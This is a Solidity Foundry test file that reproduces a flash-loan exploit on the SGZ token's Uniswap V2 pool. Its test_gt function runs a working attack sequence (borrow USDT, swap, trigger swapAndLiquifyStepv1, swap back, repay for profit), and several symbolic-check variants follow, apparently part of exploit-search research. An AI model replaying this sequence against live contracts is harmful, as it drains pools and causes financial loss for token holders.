// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./SGZ.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract SGZTest is Test, BlockLoader {
    USDT usdt;
    SGZ sgz;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdtAddr;
    address sgzAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1657743400;
    uint112 reserve0pair = 75972570174789479868300310831021;
    uint112 reserve1pair = 90560725378390149771577;
    uint32 blockTimestampLastpair = 1657743250;
    uint256 kLastpair = 6879703568427996083107228657637381495527610347420177890;
    uint256 price0CumulativeLastpair = 1112747229828982884289307841512;
    uint256 price1CumulativeLastpair =
        5052703677740238713862095790545994450382851783111;
    uint256 totalSupplysgz = 1000000000000000000000000000000000;
    uint256 balanceOfsgzpair = 75972570174789479868300310831021;
    uint256 balanceOfsgzattacker = 0;
    uint256 balanceOfsgzsgz = 76808290040410199339350019683;
    uint256 totalSupplyusdt = 4979997922172658408539526181;
    uint256 balanceOfusdtpair = 90560725378390149771577;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtsgz = 30378842175602511050329;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        sgz = new SGZ(address(usdt));
        sgzAddr = address(sgz);
        pair = new UniswapV2Pair(
            address(sgz),
            address(usdt),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        sgz.afterDeploy(address(router), address(pair));
        // Initialize balances and mock flashloan.
        usdt.transfer(address(sgz), balanceOfusdtsgz);
        sgz.transfer(address(sgz), balanceOfsgzsgz);
        usdt.transfer(address(pair), balanceOfusdtpair);
        sgz.transfer(address(pair), balanceOfsgzpair);
        usdt.approve(attacker, UINT256_MAX);
        sgz.approve(attacker, UINT256_MAX);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(sgz), address(usdt), sgz.decimals());
        emit log_string("");
        emit log_string("Sgz Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(sgz), usdt.decimals());
        queryERC20BalanceDecimals(address(sgz), address(sgz), sgz.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(sgz), address(pair), sgz.decimals());
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attackContract),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sgz),
            address(attackContract),
            sgz.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_usdt(uint256 amount) internal {
        usdt.transferFrom(owner, attacker, amount);
    }

    function payback_usdt(uint256 amount) internal {
        usdt.transfer(owner, amount);
    }

    function borrow_sgz(uint256 amount) internal {
        sgz.transferFrom(owner, attacker, amount);
    }

    function payback_sgz(uint256 amount) internal {
        sgz.transfer(owner, amount);
    }

    function swap_pair_sgz_usdt(uint256 amount) internal {
        sgz.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(sgz);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_usdt_sgz(uint256 amount) internal {
        usdt.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(sgz);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function breaklr_pair_sgz() internal {
        sgz.swapAndLiquifyStepv1();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_usdt(100e18);
        printBalance("After step0 ");
        swap_pair_usdt_sgz(usdt.balanceOf(attacker));
        printBalance("After step1 ");
        breaklr_pair_sgz();
        printBalance("After step2 ");
        swap_pair_sgz_usdt(sgz.balanceOf(attacker));
        printBalance("After step3 ");
        payback_usdt((100e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_usdt(amt0);
        swap_pair_usdt_sgz(amt1);
        breaklr_pair_sgz();
        swap_pair_sgz_usdt(amt2);
        payback_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_usdt(amt0);
        swap_pair_usdt_sgz(amt1);
        breaklr_pair_sgz();
        swap_pair_sgz_usdt(amt2);
        payback_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_sgz(amt0);
        swap_pair_sgz_usdt(amt1);
        breaklr_pair_sgz();
        swap_pair_usdt_sgz(amt2);
        payback_sgz(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_usdt(amt0);
        swap_pair_usdt_sgz(amt1);
        breaklr_pair_sgz();
        swap_pair_sgz_usdt(amt2);
        swap_pair_sgz_usdt(amt3);
        payback_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_usdt(amt0);
        swap_pair_usdt_sgz(amt1);
        breaklr_pair_sgz();
        sync_pair();
        swap_pair_sgz_usdt(amt2);
        payback_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_sgz(amt0);
        swap_pair_sgz_usdt(amt1);
        breaklr_pair_sgz();
        swap_pair_usdt_sgz(amt2);
        swap_pair_sgz_usdt(amt3);
        payback_sgz(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_sgz(amt0);
        swap_pair_sgz_usdt(amt1);
        breaklr_pair_sgz();
        sync_pair();
        swap_pair_usdt_sgz(amt2);
        payback_sgz(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_usdt(amt0);
        swap_pair_usdt_sgz(amt1);
        breaklr_pair_sgz();
        sync_pair();
        swap_pair_sgz_usdt(amt2);
        swap_pair_sgz_usdt(amt3);
        payback_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_sgz(amt0);
        swap_pair_sgz_usdt(amt1);
        breaklr_pair_sgz();
        sync_pair();
        swap_pair_usdt_sgz(amt2);
        swap_pair_sgz_usdt(amt3);
        payback_sgz(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
